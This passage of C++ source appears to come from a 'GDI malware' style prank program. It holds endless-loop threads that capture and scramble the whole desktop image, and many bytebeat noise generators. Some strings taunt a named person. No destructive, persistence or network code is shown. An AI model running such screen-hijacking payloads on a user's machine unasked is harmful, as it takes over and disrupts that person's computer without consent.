    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += i * i;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader36_NoName20(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].r = i;
            rgbScreen[i].g = y + i;
            rgbScreen[i].b += y + y * i;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
DWORD WINAPI Shader37_Last(LPVOID lpParam) {
    int num = 21;
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    int wdpi = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        int i = rand() % num;
        hdcScreen = GetDC(0);
        SetBkColor(hdcScreen, RndRGB);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].r = rand() % 55;
            rgbScreen[i].g = rand() % 78;
            rgbScreen[i].b = rand() % 91;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        for (int z = 0; z < 5; z++)TextOutA(hdcScreen, rand() % w, rand() % h, texts2[i], strlen(texts2[i]));
        ReleaseDC(NULL, hdcScreen);
        Sleep(10);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 0.1) * cos(t * 1.001));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> (3 & t) >> 0xCA98C));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 8 * 5 | (20 | 5 * (t >> 19) >> t & t >> 3)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (LONGLONG t = 0; t < 8000 * 30; ++t)
        buffer[t] = static_cast<char>(12 * (t >> 7 | t >> 4 & t));
    WAVEHDR header = { buffer, 8000 * 30, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, WAVE_FORMAT_PCM, 8, 0 };
    waveOutOpen(&hWaveOut, 0, &wfx, 0, 0, 0);
    char* buffer = new char[44100 * 30];
    for (DWORD t = 0; t < 44100 * 30; t++)
        if ((t >> 2 & t >> 12 & t) != 0) { buffer[t] = 114514 * t / (t >> 2 & t >> 12 & t); }
    WAVEHDR header = { buffer, 44100 * 30, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 4) * (1 + (7 ^ (t >> 12) ^ (t >> 2))));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 8 & t >> 2 | t >> 10 & t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, WAVE_FORMAT_PCM, 8, 0 };
    waveOutOpen(&hWaveOut, 0, &wfx, 0, 0, 0);
    char* buffer = new char[44100 * 30];
    for (DWORD t = 0; t < 44100 * 30; t++)
        buffer[t] = (t & t / 2 & t / 4) * t / 2E2;
    WAVEHDR header = { buffer, 44100 * 30, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (0x4445 << (t & t >> 5) & 15) | t << t * (rand()));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t << (t >> 11 & 1)) + (t << (t >> 13 & 14)) + (t << (t >> 11 & 45)) | t * rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * ("N78Bro1314"[t >> 10 & 7] >> 2) | ~t >> 8) + 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8192, 8192, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8192 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(tan(t >> 5 >> t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * ("n17pro3426 is a brunch l0s3r,not a h4k3r."[t & 39] >> (t >> 11 & 39) & 15)) | (t * ("n17pro3426 is not welcome in GDI."[t & 31] >> (t >> 11 & 31) & 15)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, WAVE_FORMAT_PCM, 8, 0 };
    waveOutOpen(&hWaveOut, 0, &wfx, 0, 0, 0);
    char* buffer = new char[44100 * 30];
    for (LONGLONG t = 0; t < 44100 * 30; t++)
        buffer[t] = t * t / (double)(t >> 2 & t >> 12 | (t >> (t >> 12)));
    WAVEHDR header = { buffer, 44100 * 30, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(40 + ((10 * t & t >> 4 | 9 * t & t >> 7 | 6 * t & t >> 9 | 4 * t & t >> 10) & 255) % 256 / 3 + 40);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(64 + sin(t * (t >> (t >> 13) % 15) | (int(t / 2000) % 4)) * 50);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (LONGLONG t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(cbrt(t * 6 * (t >> 8 | t)) * 255);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (LONGLONG t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t / 4 * ((t >> 12 ^ (t >> 12) - 2) % 11) | t >> 13) & 127) + (t / 4 * (0x11451478 >> (t >> 11 & 28) & 15) & 128));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)tan(t ^ t >> 10) * t >> 8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> (t >> 2 & t >> 7)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound21() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 2 * t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound22() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 4000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[4000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ("No N17Pro3426"[t >> 9 & 11]) | t << t * rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound23() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t * (0xadfa1230 >> (t >> 9 & 30) & 15)) | ~t >> 8) + (rand() % 48));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound24() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 4 | t >> 5 | t >> 6 | t >> 7 | t >> 8));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound25() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)tan(t >> 4 * t >> 4) | (t << t * rand() & t >> 9));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound26() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t & 4095) * (254 & t * (t | t >> 12)) >> 11) - (120 & t * (239 & t >> 10 & t >> 4) >> (2 & t >> 10)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound27() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)tan(sin(cos(t & t >> 12 | t + t >> t))) & t >> 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound28() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 5 | t >> 4) * t >> 4 ^ t * 9);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound29() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : (t & 2048 ? 9 : 19) : 16) + (1 & t >> 14)) >> (t % 65536 < 59392 ? 2 & (0 - t) >> 10 : 0) | t * rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound30() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t & 9 * (t >> 2 | t >> 7));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound31() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << (t >> 12 & t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound32() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5 & t >> 7 | t * 9 & t >> 4 | (t * 3 & t >> 10) - 1) & 64);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound33() {
    HWAVEOUT hWaveOut = 0;
